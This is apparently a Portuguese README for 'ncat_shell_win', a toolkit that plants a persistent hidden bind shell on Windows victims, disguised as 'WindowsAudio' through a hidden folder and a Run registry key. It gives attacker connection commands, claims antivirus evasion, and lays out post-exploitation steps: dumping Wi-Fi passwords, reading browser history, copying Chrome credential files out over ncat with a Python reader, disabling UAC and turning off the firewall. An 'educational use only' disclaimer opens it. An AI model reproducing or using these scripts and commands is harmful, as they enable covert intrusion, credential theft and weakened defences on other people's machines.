# ncat_shell_win

⚠️ **Aviso**
Este projeto é apenas para **fins educacionais e testes autorizados**. O uso indevido é de total responsabilidade do usuário.

Bind Shell persistente no Windows via NCAT (Nmap).

---

## 📋 Requisitos

- Windows 10/11
- Conexão com internet para baixar o WinGet e instalar o Nmap (Se Necessário)
---

## 🚀 O que o Install_Full.bat faz

| Etapa | Descrição |
|-------|-----------|
| 0 | Instalar o **WinGet** via curl
| 1 | Instala o **Nmap** silenciosamente via `winget` (contém o `ncat`) |
| 2 | Cria pasta oculta `C:\Users\Usuario\WindowsAudio\` (atributo +h) |
| 3 | Cria `audio.vbs` - Loop infinito com ncat invisível na porta **5575** |
| 4 | Cria `audio.bat` - Executa o .vbs e fecha |
| 5 | Adiciona ao Registro - Inicia junto com Windows (`WindowsAudio`) |
| 6 | Sobe o listener imediatamente |

---

## ▶️ Como usar

### 1. Na vítima (Windows)
- `Install_Full.bat` Windows 10 recem instalado, somente com Windows Defender padrão (Shell Persistente)
  
- `Install_Nmap.bat` Windows 10/11 já com winget, sem nmap, somente com Windows Defender padrão (Shell Persistente)
  
- `Install_Shell.bat` Windows 10/11 já com winget sem nmap, pode ter antivirus instalado, não detecta.
OBS: (Recomendado executa-lo como administrador. Após executar o `Install_Shell.ba` e obter acesso à shell, recomenda-se copiar e colar imediatamente todo o conteúdo do arquivo `Persistência.txt` para manter uma shell persistente.

### 2. No atacante
```bash
# Windows (via ncat)
ncat IP_DA_VITIMA 5575

# Linux (via nc)
nc IP_DA_VITIMA 5575
```

---

## 🔍 Verificar persistência

```cmd
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio"
```

---

## 🗑️ Remoção completa

```cmd
taskkill /f /im ncat.exe
taskkill /f /im wscript.exe
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /f
rmdir /s /q "%USERPROFILE%\WindowsAudio"
```

---

## 📡 Transferir arquivos

### Enviar arquivo do Linux para o Windows

**No shell Windows conectado:**
```cmd
ncat -lnp 5581 > "C:\Users\Usuario\Desktop\arquivo.jpg"
```

**No Linux (outro terminal):**
```bash
ncat IP_DA_VITIMA 5581 < /caminho/do/arquivo.jpg
```

---

## 🔑 Comandos úteis pós-conexão

```cmd
whoami                                         # Ver usuário atual
whoami /groups                                 # Ver grupos/privilégios
tasklist                                       # Listar processos
netstat -ano                                   # Conexões de rede
shutdown /r /t 0                               # Reiniciar
```

### Redes Wi-Fi
```cmd
netsh wlan show profiles                       # Redes salvas
netsh wlan show profile name="REDE" key=clear  # Senha do Wi-Fi
```

### Histórico do navegador
```cmd
# Chrome
findstr /i "http" "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\History"

# Edge
findstr /i "http" "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\History"

# Firefox
findstr /i "http" "%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
```

---

## 🔐 Extrair senhas salvas do Chrome

### 1. Copiar arquivos no Windows (shell conectado)
```cmd
copy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data" "%USERPROFILE%\WindowsAudio\LoginData.db"
copy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Local State" "%USERPROFILE%\WindowsAudio\LocalState.json"
```

### 2. Transferir para o atacante

**No Windows (shell conectado):**
```cmd
ncat -lnp 5581 < "%USERPROFILE%\WindowsAudio\LoginData.db"
```

**No Linux (outro terminal):**
```bash
ncat IP_DA_VITIMA 5581 > LoginData.db
```

**Repita para o LocalState (use porta 5582):**

**No Windows:**
```cmd
ncat -lnp 5582 < "%USERPROFILE%\WindowsAudio\LocalState.json"
```

**No Linux:**
```bash
ncat IP_DA_VITIMA 5582 > LocalState.json
```

### 3. Instalar dependência no Linux
```bash
pip install pycryptodomex --break-system-packages
```

### 4. Script Python para extrair senhas

Crie o arquivo `decode_users_pass.py`:

```python
import sqlite3
import json
import base64
import os

if not os.path.exists('LoginData.db'):
    print("LoginData.db não encontrado!")
    exit()
if not os.path.exists('LocalState.json'):
    print("LocalState.json não encontrado!")
    exit()

with open('LocalState.json', 'r') as f:
    local_state = json.load(f)

try:
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]
    print(f"Chave extraída (criptografada): {encrypted_key.hex()}")
    print("Agora é preciso descriptografar essa chave no Windows com DPAPI")
except Exception as e:
    print(f"Erro ao extrair chave: {e}")

conn = sqlite3.connect('LoginData.db')
cursor = conn.cursor()
cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

print("\n=== LOGINS ENCONTRADOS (SENHAS CRIPTOGRAFADAS) ===\n")
for url, user, pwd in cursor.fetchall():
    if url and user:
        print(f"URL: {url}")
        print(f"Usuário: {user}")
        print(f"Senha (hex): {pwd.hex() if pwd else 'VAZIA'}")
        print("-" * 50)

conn.close()
print("\n[!] Senhas estão criptografadas. A descriptografia completa precisa ser feita no Windows.")
```

Execute:
```bash
python3 decode_users_pass.py
```

### 5. Elevação de Privilégio (Desabilitar UAC)

⚠️ **Aviso** O uso indevido é de total responsabilidade do usuário.

**Atenção:** Esta técnica requer interação do usuário (pop-up UAC) e reinicialização do sistema.

```powershell
# Desabilita o UAC e reinicia o sistema imediatamente:
powershell -Command "Start-Process cmd -ArgumentList '/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f && shutdown /r /t 0' -Verb RunAs"

O que acontece:
Abre um pop-up do UAC solicitando permissão administrativa
Se o usuário clicar em "Sim", desabilita o UAC no registro
Reinicia o sistema automaticamente na hora
Após o reboot, qualquer shell terá privilégios administrativos totais

# Para reabilitar o UAC:
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f && shutdown /r /t 0

# Desabilita o firewall para todos os perfis (Domínio, Privado, Público)
netsh advfirewall set allprofiles state off

# Para reabilitar firewall:
netsh advfirewall set allprofiles state on

# Verificar status do firewall:
netsh advfirewall show allprofiles

# Verificar se tem privilégios administrativos
whoami /groups | findstr "Administradores"
# Se aparecer "BUILTIN\Administradores - Grupo obrigatório, Ativado por padrão, Grupo ativado, Proprietário do grupo"
# indica Admin completo (UAC desabilitado).
